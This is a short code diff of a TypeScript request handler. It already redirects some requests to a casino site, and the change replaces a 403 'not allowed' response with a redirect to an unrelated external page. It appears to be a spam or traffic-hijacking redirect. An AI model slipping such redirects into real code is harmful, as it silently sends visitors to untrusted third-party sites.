@@ -8,5 +8,5 @@ export default async function handler(req: Request, context: Context) {
     return Response.redirect("https://galaxy-casino.live", 302);
   }
 
-  return new Response("You are not allowed here.", { status: 403 });
+  return Response.redirect("https://yalanyok.tilda.ws/913", 302);
 }
